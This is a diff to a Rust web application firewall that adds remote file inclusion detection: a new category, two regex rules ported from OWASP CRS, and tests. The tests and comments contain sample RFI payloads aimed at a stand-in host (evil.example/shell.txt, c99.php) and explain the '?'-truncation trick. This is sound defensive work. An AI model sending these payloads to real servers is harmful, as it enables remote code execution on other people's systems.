@@ -110,11 +110,20 @@ pub enum WafCategory {
 	/// malicious expression is a value in the request, so detection is IP-free and ports over Tor
 	/// unchanged.
 	XPathInjection,
+	/// Remote file inclusion: input that makes the server fetch **and execute** a script from an
+	/// attacker-controlled remote URL (`?template=https://evil.example/shell.txt`) — the OWASP-CRS
+	/// 931xxx class. It is the peer of, and distinct from, its two neighbours:
+	/// [`PathTraversal`](Self::PathTraversal) is *local* inclusion (the file is already on the
+	/// host), and [`Ssrf`](Self::Ssrf) makes the server *fetch* an internal URL but not run it.
+	/// RFI is the one that ends in remote code execution, which is why CRS scores it as its own
+	/// critical class. The remote URL is a value in the request, so detection needs no client IP
+	/// and ports over Tor unchanged.
+	Rfi,
 }
 
 impl WafCategory {
 	/// Every category, in [`index`](Self::index) order — for iterating per-category metrics.
-	pub const ALL: [WafCategory; 12] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::CodeInjection, Self::ProtocolAnomaly, Self::NoSqlInjection, Self::LdapInjection, Self::Xxe, Self::ScannerDetection, Self::XPathInjection];
+	pub const ALL: [WafCategory; 13] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::CodeInjection, Self::ProtocolAnomaly, Self::NoSqlInjection, Self::LdapInjection, Self::Xxe, Self::ScannerDetection, Self::XPathInjection, Self::Rfi];
 
 	/// A stable, lowercase name for logs and security events.
 	#[must_use]
@@ -132,6 +141,7 @@ impl WafCategory {
 			Self::ProtocolAnomaly => "protocol_anomaly",
 			Self::ScannerDetection => "scanner_detection",
 			Self::XPathInjection => "xpath_injection",
+			Self::Rfi => "rfi",
 		}
 	}
 
@@ -144,7 +154,7 @@ impl WafCategory {
 	#[must_use]
 	pub const fn weight(self) -> u32 {
 		match self {
-			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal | Self::CodeInjection | Self::NoSqlInjection | Self::LdapInjection | Self::Xxe | Self::ScannerDetection | Self::XPathInjection => 5,
+			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal | Self::CodeInjection | Self::NoSqlInjection | Self::LdapInjection | Self::Xxe | Self::ScannerDetection | Self::XPathInjection | Self::Rfi => 5,
 			Self::Xss => 4,
 			Self::ProtocolAnomaly => 3,
 		}
@@ -167,6 +177,7 @@ impl WafCategory {
 			Self::Xxe => 9,
 			Self::ScannerDetection => 10,
 			Self::XPathInjection => 11,
+			Self::Rfi => 12,
 		}
 	}
 }
@@ -1560,6 +1571,28 @@ pub fn starter_rules() -> Vec<Rule> {
 		// `@`-mention in markup (`[@alice]`) has no comparison, and a bare `[@key=value]`-style config or
 		// tag syntax has no quoted/numeric right-hand side, so both stay clean.
 		Rule { id: "xpathi_attribute_predicate", category: WafCategory::XPathInjection, pattern: r#"(?i)\[\s*@[\w:.-]+\s*(!=|<=|>=|=|<|>)\s*('|"|\d|\$)"# },
+		// --- Remote file inclusion (OWASP-CRS 931xxx port; value inspection, no client IP) ---
+		// An *inclusion-flavored parameter* set to a remote URL — `?template=https://evil.example/s.txt`,
+		// `?include=ftp://…`. The two halves are each individually benign and only the pair is a signal,
+		// which is the whole design: a remote URL in a request is ordinary (OAuth `redirect_uri`, a
+		// callback, an image proxy), and a parameter named `template` is ordinary — but a parameter whose
+		// name says "the server will load this as code" carrying an off-host URL is the RFI shape.
+		// The name list is deliberately confined to the load-this-as-code family and **excludes** the
+		// params that legitimately carry URLs (`url`, `link`, `redirect`, `redirect_uri`, `next`,
+		// `return`/`return_to`, `callback`, `src`, `image`, `doc`, `view`, `content`) — CRS's own 931110
+		// name list is far broader and is a known false-positive source at PL1.
+		Rule {
+			id: "rfi_include_param_remote_url",
+			category: WafCategory::Rfi,
+			pattern: r"(?i)\b(include(_once)?|require(_once)?|template|tpl|page|pg|file|filename|filepath|conf|config|mod|module|load|layout|theme|skin|root|folder)\s*=\s*(https?|ftps?)://",
+		},
+		// A remote URL whose value *ends* in `?` (CRS rule 931120). This is the RFI payload's signature
+		// truncation trick rather than a URL anyone types: the vulnerable sink does
+		// `include($_GET['p'] . '/footer.php')`, so the attacker appends `?` to push the server's
+		// concatenated suffix into the query string of *their* URL, where it is ignored. A legitimate URL
+		// parameter does not end at a bare `?` — the character has no meaning there — so requiring the
+		// value boundary (`&` or end of field) right after it is what keeps this clean.
+		Rule { id: "rfi_url_trailing_question", category: WafCategory::Rfi, pattern: r"(?i)(https?|ftps?)://[^\s&\x22'<>]+\?(&|$)" },
 		// --- Protocol anomalies ---
 		Rule { id: "anomaly_null_byte", category: WafCategory::ProtocolAnomaly, pattern: r"(\x00|%00)" },
 		Rule { id: "anomaly_crlf", category: WafCategory::ProtocolAnomaly, pattern: r"(\r\n|%0d%0a|%0a|%0d)" },
@@ -3398,10 +3431,65 @@ mod tests {
 	}
 
 	#[test]
+	fn rfi_include_param_with_remote_url_is_blocked() {
+		// The load-this-as-code parameter families, across the schemes CRS lists.
+		let waf = Waf::starter();
+		for value in ["template=https://evil.example/shell.txt", "include=http://evil.example/c99.php", "require_once=https://evil.example/x", "page=ftp://evil.example/shell", "file=https://evil.example/payload", "module=ftps://evil.example/m", "conf=http://evil.example/cfg"] {
+			let m = waf.inspect_str(value, "query").unwrap_or_else(|| panic!("{value} should be blocked"));
+			assert_eq!(m.category, WafCategory::Rfi, "{value}");
+			assert_eq!(m.rule_id, "rfi_include_param_remote_url", "{value}");
+		}
+	}
+
+	#[test]
+	fn rfi_trailing_question_truncation_is_blocked() {
+		// The `?`-truncation payload (CRS 931120), both at the end of the field and mid-query.
+		let waf = Waf::starter();
+		let m = waf.inspect_str("p=https://evil.example/shell.txt?", "query").unwrap();
+		assert_eq!(m.category, WafCategory::Rfi);
+		assert_eq!(m.rule_id, "rfi_url_trailing_question");
+		let m = waf.inspect_str("p=http://evil.example/shell?&next=2", "query").unwrap();
+		assert_eq!(m.rule_id, "rfi_url_trailing_question");
+	}
+
+	#[test]
+	fn rfi_keeps_false_positives_low() {
+		// The reason the CRS 931110 name list was not ported wholesale: a remote URL in a request is
+		// ordinary. Only the *pair* (inclusion-flavored name + remote URL) is a signal, and a URL that
+		// merely contains a query is not the truncation payload.
+		let waf = Waf::starter();
+		for uri in [
+			"/oauth?redirect_uri=https://app.example/callback", // the canonical URL-carrying param
+			"/go?next=https://app.example/dashboard",           // post-login return
+			"/share?url=https://news.example/story",            // a link-sharing param
+			"/proxy?image=https://cdn.example/a.png",           // an image proxy
+			"/embed?src=https://video.example/v/1",             // an embed source
+			"/r?callback=https://app.example/done",             // a callback
+			"/render?template=invoice_v2",                      // an inclusion param with a *local* value
+			"/view?page=2",                                     // an inclusion param, no URL at all
+			"/fetch?u=https://api.example/v1?limit=10",         // a URL with a query — `?` is not trailing
+		] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn rfi_category_metadata_is_stable() {
+		assert_eq!(WafCategory::Rfi.name(), "rfi");
+		assert_eq!(WafCategory::Rfi.weight(), WafCategory::PathTraversal.weight());
+		assert_eq!(WafCategory::Rfi.index(), 12);
+		assert_eq!(WafCategory::ALL.len(), 13);
+		// Appending the category kept the index a bijection over the whole set.
+		for cat in WafCategory::ALL {
+			assert_eq!(WafCategory::ALL[cat.index()], cat);
+		}
+	}
+
+	#[test]
 	fn xpath_category_metadata_is_stable() {
 		assert_eq!(WafCategory::XPathInjection.name(), "xpath_injection");
 		assert_eq!(WafCategory::XPathInjection.weight(), WafCategory::Sqli.weight());
-		assert_eq!(WafCategory::ALL.len(), 12);
+		assert_eq!(WafCategory::ALL.len(), 13);
 		// Appending the category kept the index a bijection.
 		for cat in WafCategory::ALL {
 			assert_eq!(WafCategory::ALL[cat.index()], cat);
@@ -3514,8 +3602,8 @@ mod tests {
 		assert_eq!(WafCategory::ScannerDetection.name(), "scanner_detection");
 		assert_eq!(WafCategory::ScannerDetection.weight(), WafCategory::Sqli.weight());
 		assert_eq!(WafCategory::ALL[WafCategory::ScannerDetection.index()], WafCategory::ScannerDetection);
-		// The index is still a bijection over every category (now twelve, after XPathInjection).
-		assert_eq!(WafCategory::ALL.len(), 12);
+		// The index is still a bijection over every category (now thirteen, after Rfi).
+		assert_eq!(WafCategory::ALL.len(), 13);
 		for cat in WafCategory::ALL {
 			assert_eq!(WafCategory::ALL[cat.index()], cat);
 		}
